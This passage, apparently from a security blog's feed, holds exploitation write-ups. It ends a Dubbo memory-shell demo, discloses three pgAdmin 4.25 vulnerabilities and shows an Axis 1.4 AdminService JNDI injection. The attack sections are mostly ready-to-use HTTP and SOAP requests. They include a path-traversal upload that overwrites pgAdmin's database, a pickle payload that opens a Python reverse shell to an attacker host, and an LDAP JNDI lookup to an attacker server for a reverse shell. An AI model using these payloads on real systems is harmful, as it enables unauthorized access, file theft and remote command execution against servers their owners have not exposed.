client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">'x.extendService'</span>,service_version=<span class="string">""</span>,</span><br><span class="line">    method_name=<span class="string">'cmd'</span>,</span><br><span class="line">    args=[JavaString(<span class="string">"open -na calculator"</span>)])</span><br><span class="line"></span><br><span class="line">print(resp)</span><br></pre></td></tr></table></figure><p><img src="/images/2021/10/20211005142118889_1153374198.png" alt></p><h2 id="部分疑问"><a href="#部分疑问" class="headerlink" title="部分疑问"></a>部分疑问</h2><ol><li>http over hessian内存马，为啥不直接注入jetty filter或者servlet马？<br>目前使用网上jetty内存马无法在dubbo中找到org.eclipse.jetty.webapp:type=webappcontext对象</li></ol><hr><p>随便写写，抛砖引玉，如有错误请联系。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学习源码顺便玩玩内存马加深印象，比如某些环境不想触发反弹shell触发告警可以写入内存马方便快速操作（命令执行，文件管理，绕rasp,waf等）&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Multiple vulnerabilities in pgadmin &lt;= 4.25</title>
    <link href="http://yoursite.com/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/Multiple%20vulnerabilities%20in%20pgadmin4/"/>
    <id>http://yoursite.com/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/Multiple%20vulnerabilities%20in%20pgadmin4/</id>
    <published>2020-11-21T03:30:48.000Z</published>
    <updated>2020-11-21T03:38:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>pgadmin4 vulnerabilities Affected version: 4.25 and below, fixed 4.26</p><a id="more"></a><p><a href="https://github.com/postgres/pgadmin4/tree/REL-4_25" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/postgres/pgadmin4/tree/REL-4_25</a></p><p>Affected version: 4.25 and below, fixed 4.26</p><p>Three vulnerabilities found</p><h2 id="1-pgadmin-login-verification-defect-lead-to-easy-brute-force-cracking"><a href="#1-pgadmin-login-verification-defect-lead-to-easy-brute-force-cracking" class="headerlink" title="1. pgadmin login verification defect lead to easy brute force cracking"></a>1. pgadmin login verification defect lead to easy brute force cracking</h2><p>Vulnerability analysis：<br>pgadmin uses flask-security to build authentication login, but when the user name is entered as a number,<br>the program will perform user_model.query.get query and return the object：</p><p>/flask_security/datastore.py:521<br><img src="/images/2020/11/20201121105546651_11068.png" alt></p><p>​                                              </p><p>When the user object exists, pgadmin will prompt that the password is incorrect. When logging in to the system,<br>you don’t need to know the email and username. You only need to enter the number and brute force it to get the system login permission easily.<br><img src="/images/2020/11/20201121105556680_17040.png" alt></p><p>test environment:<br>pgadmin4<br>username: <a href="mailto:user@pgadmin.com" rel="external nofollow noopener noreferrer" target="_blank">user@pgadmin.com</a><br><img src="/images/2020/11/20201121105608086_4712.png" alt></p><p>When the number 1 is entered, the password is incorrect, indicating that the database information is matched successfully<br><img src="/images/2020/11/20201121105616936_11287.png" alt></p><p>You can traverse and blast all the passwords of the correct login account through the primary key id to enter the system:<br><img src="/images/2020/11/20201121105627807_9044.png" alt></p><h2 id="2-pgadmin-File-Manage-interface-arbitrary-file-reading"><a href="#2-pgadmin-File-Manage-interface-arbitrary-file-reading" class="headerlink" title="2. pgadmin  File Manage interface arbitrary file reading"></a>2. pgadmin  File Manage interface arbitrary file reading</h2><p>Vulnerability demo：</p><p>1) Use the administrator account to add a account and use the PUT method to modify the user name to “/“:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/user_management/user/2</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.123.120</span><br><span class="line"><span class="attribute">Content-Length</span>: 166</span><br><span class="line"><span class="attribute">X-pgA-CSRFToken</span>: IjJjMmU5OTc5OTZjMTgwMWUwMThiNDkyYjhkZTVmODBmYjQ0MDYwNDUi.X1ULJg.WWZ-cfX1AKkHFHjmR0g0FRTKqz4</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.123.120</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.123.120/browser/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh,zh-TW;q=0.9,zh-CN;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: pga4_session=83ebba90-43f8-4668-89c0-16658c579a4e!//j+Ar0ZU2BcDih+7YkSWPbIs7A=; PGADMIN_LANGUAGE=en</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"email":"sectest@sec.com","username":"/","active":true,"role":"1","newPassword":"123456","confirmPassword":"123456","auth_source":"internal","authOnlyInternal":true&#125;</span><br></pre></td></tr></table></figure><p>2) modify username to “/“ success:<br><img src="/images/2020/11/20201121105756416_4334.png" alt></p><p><img src="/images/2020/11/20201121105804288_11677.png" alt></p><p><img src="/images/2020/11/20201121105811089_18635.png" alt></p><p>5）Find the download interface from the code to download any file：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/file_manager/filemanager/6122200/?mode=download&amp;path=/pgadmin4/config.py</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.123.120</span><br><span class="line"><span class="attribute">X-pgA-CSRFToken</span>: IjZhZDQ4MjZhNDcyZjU5MzMzZTRiMGJjYzkwNjAyMzQ2NDI5NDYyNDEi.X1jpeg.DfOX46UksQVkitJwyUrD2S5viNE</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.123.120/browser/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-TW,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: pga4_session=2a7c0e68-3f5c-4fb9-a5e7-aea4ab980c43!mrbtthlY17M0iphrp2Lg8S0Lj8c=; PGADMIN_LANGUAGE=en</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><p><img src="/images/2020/11/20201121105826201_32387.png" alt></p><p>Vulnerability analysis:</p><p>def get_storage_directory() Used to get the upload file storage directory：<br>The Code uses os.path.join to combine username and default storage directory，If the user name is “/“, os.path.join defaults to “/“，so also bypass function check_access_permission() ：<br><img src="/images/2020/11/20201121105841959_30404.png" alt></p><p><img src="/images/2020/11/20201121105850458_29747.png" alt></p><h2 id="3-Arbitrary-file-upload-overwrites-sqlite-execution-deserialization-causing-command-execution"><a href="#3-Arbitrary-file-upload-overwrites-sqlite-execution-deserialization-causing-command-execution" class="headerlink" title="3. Arbitrary file upload overwrites sqlite execution deserialization causing command execution"></a>3. Arbitrary file upload overwrites sqlite execution deserialization causing command execution</h2><p>filemanage file name upload across directories：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/file_manager/filemanager/8388910/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.123.120</span><br><span class="line"><span class="attribute">Content-Length</span>: 12957</span><br><span class="line"><span class="attribute">X-pgA-CSRFToken</span>: ImQ5NmM3MTVkYzU4YmI3N2I2YTE4MWQxMGUwODBlODNhYjc4ZTRjYjgi.X1TlHw.-VQMlcTtNAoFqsWnpHO_cthP3J4</span><br><span class="line"><span class="attribute">Accept</span>: application/json</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundarywdHFG1O2RvkHKzD6</span><br><span class="line"><span class="attribute">Origin</span>: http://192.168.123.120</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.123.120/browser/</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh,zh-TW;q=0.9,zh-CN;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; pga4_session=8f8dfd18-0096-498a-a8c2-0582e3572583!IAaD6RQYJyFCoiURqUx9tldKZS0=; PGADMIN_LANGUAGE=en</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarywdHFG1O2RvkHKzD6</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="mode"</span><br><span class="line"></span><br><span class="line"><span class="attribute">add</span></span><br><span class="line"><span class="attribute">------WebKitFormBoundarywdHFG1O2RvkHKzD6</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="currentpath"</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">------WebKitFormBoundarywdHFG1O2RvkHKzD6</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="newfile"; filename="../../../../../../../../../../var/lib/pgadmin/pgadmin4.db"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/gif</span><br><span class="line"></span><br><span class="line">database content.......................................</span><br></pre></td></tr></table></figure><p>1)  overwrites sqlite database：<br><img src="/images/2020/11/20201121105922830_29183.png" alt></p><p>2）Create a pickle object for the process.desc field：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">a = <span class="string">'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"vps_address\\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);"'</span></span><br><span class="line"><span class="keyword">return</span> (os.system,(a,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line"><span class="comment"># OK, now for the DB part: we make it...:</span></span><br><span class="line">db = sqlite3.connect(<span class="string">'pgadmin4.db'</span>)</span><br><span class="line">db.execute(<span class="string">'UPDATE process set desc = (?) where pid="123"'</span>, (s,))</span><br><span class="line">db.commit()</span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure><p>database content：<br><img src="/images/2020/11/20201121105949080_23616.png" alt></p><p>3）GET requests /misc/bgprocess/  Trigger the deserialization operation to read the content of the process.desc field to cause the command to execute：<br><img src="/images/2020/11/20201121110003704_24764.png" alt></p><p><img src="/images/2020/11/202020201121110010674_32510.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pgadmin4 vulnerabilities Affected version: 4.25 and below, fixed 4.26&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞挖掘" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
  </entry>
  
  <entry>
    <title>axis 1.4 AdminService未授权访问 jndi注入利用</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/axis%201.4%20AdminService%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20jndi%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/axis%201.4%20AdminService%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%20jndi%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8/</id>
    <published>2020-06-30T10:19:35.000Z</published>
    <updated>2020-07-06T12:17:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近利用一个漏洞Axis 1.4 adminservice开启远程访问下可新建服务执行任意方法, 写文件出现问题可试试本文利用默认包中的jndi lookup注入恶意class执行反弹shell</p><a id="more"></a><h2 id="0x01-漏洞形成前提"><a href="#0x01-漏洞形成前提" class="headerlink" title="0x01 漏洞形成前提"></a>0x01 漏洞形成前提</h2><p>Axis 1.4<br>AdminService enableRemoteAdmin == True</p><h2 id="0x02-搭建"><a href="#0x02-搭建" class="headerlink" title="0x02 搭建"></a>0x02 搭建</h2><p>axis bin包解压后将webapps下axis复制到tomcat环境下的webapps目录下：<br><a href="http://mirror.navercorp.com/apache/axis/axis/java/1.4/" target="_blank" rel="external nofollow noopener noreferrer">http://mirror.navercorp.com/apache/axis/axis/java/1.4/</a></p><h3 id="1-更新环境变量"><a href="#1-更新环境变量" class="headerlink" title="1. 更新环境变量"></a>1. 更新环境变量</h3><p>执行本地构建命令时需要环境变量找到jar包路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.profile</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> AXIS_HOME=/var/lib/tomcat8/webapps/axis</span><br><span class="line"><span class="built_in">export</span> AXIS_LIB=<span class="variable">$AXIS_HOME</span>/WEB-INF/lib</span><br><span class="line"><span class="built_in">export</span> AXISCLASSPATH=<span class="variable">$AXIS_LIB</span>/axis.jar:<span class="variable">$AXIS_LIB</span>/commons-discovery-0.2.jar:<span class="variable">$AXIS_LIB</span>/commons-logging-1.0.4.jar:<span class="variable">$AXIS_LIB</span>/jaxrpc.jar:<span class="variable">$AXIS_LIB</span>/saaj.jar:<span class="variable">$AXIS_LIB</span>/log4j-1.2.8.jar:<span class="variable">$AXIS_LIB</span>/xml-apis.jar:<span class="variable">$AXIS_LIB</span>/xercesImpl.jar:<span class="variable">$AXIS_LIB</span>/wsdl4j-1.5.1.jar</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.profile</span><br></pre></td></tr></table></figure><h3 id="2-开启RemoteAdmin服务"><a href="#2-开启RemoteAdmin服务" class="headerlink" title="2.开启RemoteAdmin服务"></a>2.开启RemoteAdmin服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">webapps/axis/WEB-INF/deploy.wsdd</span><br><span class="line"></span><br><span class="line">&lt;deployment xmlns=<span class="string">"http://xml.apache.org/axis/wsdd/"</span></span><br><span class="line">    xmlns:java=<span class="string">"http://xml.apache.org/axis/wsdd/providers/java"</span>&gt;</span><br><span class="line">  &lt;service name=<span class="string">"AdminService"</span> provider=<span class="string">"java:MSG"</span>&gt;</span><br><span class="line">    &lt;parameter name=<span class="string">"className"</span> value=<span class="string">"org.apache.axis.utils.Admin"</span>/&gt;</span><br><span class="line">    &lt;parameter name=<span class="string">"allowedMethods"</span> value=<span class="string">"*"</span>/&gt;</span><br><span class="line">    &lt;parameter name=<span class="string">"enableRemoteAdmin"</span> value=<span class="string">"true"</span>/&gt;</span><br><span class="line">  &lt;/service&gt;</span><br><span class="line">&lt;/deployment&gt;</span><br></pre></td></tr></table></figure><h3 id="3-部署刷新配置"><a href="#3-部署刷新配置" class="headerlink" title="3.部署刷新配置"></a>3.部署刷新配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="variable">$AXISCLASSPATH</span> org.apache.axis.client.AdminClient deploy.wsdd</span><br></pre></td></tr></table></figure><p><img src="/images/2020/06/20200630161113743_15305.png" alt></p><h2 id="0x03-源码找到一处jndi调用"><a href="#0x03-源码找到一处jndi调用" class="headerlink" title="0x03 源码找到一处jndi调用"></a>0x03 源码找到一处jndi调用</h2><h3 id="1-检索axis服务默认可调用的jar包："><a href="#1-检索axis服务默认可调用的jar包：" class="headerlink" title="1.检索axis服务默认可调用的jar包："></a>1.检索axis服务默认可调用的jar包：</h3><p><img src="/images/2020/06/20200630161408398_25204.png" alt></p><p>在源码中中发现org.apache.axis.client.ServiceFactory下getService服务中获取environment中的jndiName再进行context.lookup, 这样我们可以通过设置jndiName参数为恶意的服务完成攻击：<br><img src="/images/2020/06/20200630161808088_31488.png" alt></p><h2 id="0x04-利用过程"><a href="#0x04-利用过程" class="headerlink" title="0x04 利用过程"></a>0x04 利用过程</h2><h3 id="1-注册服务："><a href="#1-注册服务：" class="headerlink" title="1.注册服务："></a>1.注册服务：</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /axis/services/AdminService HTTP/1.1</span><br><span class="line">Host: 192.168.123.136:8080</span><br><span class="line">Connection: close</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">SOAPAction: something</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 737</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:api</span>=<span class="string">"http://127.0.0.1/Integrics/Enswitch/API"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ns1:deployment</span> <span class="attr">xmlns:ns1</span>=<span class="string">"http://xml.apache.org/axis/wsdd/"</span> <span class="attr">xmlns</span>=<span class="string">"http://xml.apache.org/axis/wsdd/"</span> <span class="attr">xmlns:java</span>=<span class="string">"http://xml.apache.org/axis/wsdd/providers/java"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ns1:service</span> <span class="attr">name</span>=<span class="string">"test1Service"</span> <span class="attr">provider</span>=<span class="string">"java:RPC"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ns1:parameter</span> <span class="attr">name</span>=<span class="string">"className"</span> <span class="attr">value</span>=<span class="string">"org.apache.axis.client.ServiceFactory"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ns1:parameter</span> <span class="attr">name</span>=<span class="string">"allowedMethods"</span> <span class="attr">value</span>=<span class="string">"*"</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">ns1:service</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ns1:deployment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/2020/06/20200630162901749_9740.png" alt></p><h3 id="2-调用jndi服务："><a href="#2-调用jndi服务：" class="headerlink" title="2.调用jndi服务："></a>2.调用jndi服务：</h3><p>访问创建的test1Service进行jndi注入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">POST /axis/services/test1Service HTTP/1.1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.123.136:8080/axis/servlet/AxisServlet</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh,zh-TW;q=0.9,zh-CN;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">SOAPAction:</span><br><span class="line">Content-Type: text/xml;charset=UTF-8</span><br><span class="line">Host: 192.168.123.136:8080</span><br><span class="line">Content-Length: 720</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:buil</span>=<span class="string">"http://build.antlr"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">buil:getService</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">environment</span> <span class="attr">xmlns:apachesoap</span>=<span class="string">"http://xml.apache.org/xml-soap"</span> <span class="attr">xmlns:soapenc</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span> <span class="attr">xsi:type</span>=<span class="string">"apachesoap:Map"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">key</span> <span class="attr">xsi:type</span>=<span class="string">"soapenc:string"</span>&gt;</span>jndiName<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">value</span> <span class="attr">xsi:type</span>=<span class="string">"soapenc:string"</span>&gt;</span>ldap://[vps_adress]:1389/Reverse1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">buil:getService</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-marshalsec-ldap-反弹shell："><a href="#3-marshalsec-ldap-反弹shell：" class="headerlink" title="3.marshalsec ldap 反弹shell："></a>3.marshalsec ldap 反弹shell：</h3><p><img src="/images/2020/06/20200630162533814_25320.png" alt></p><p><img src="/images/2020/06/20200630162541601_20731.png" alt></p><h3 id="4-卸载服务"><a href="#4-卸载服务" class="headerlink" title="4.卸载服务:"></a>4.卸载服务:</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /axis/services/AdminService HTTP/1.1</span><br><span class="line">Host: 192.168.123.136:8080</span><br><span class="line">Connection: close</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">SOAPAction: something</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 463</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:api</span>=<span class="string">"http://127.0.0.1/Integrics/Enswitch/API"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">undeployment</span> <span class="attr">xmlns</span>=<span class="string">"http://xml.apache.org/axis/wsdd/"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">service</span> <span class="attr">name</span>=<span class="string">"test1Service"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">undeployment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 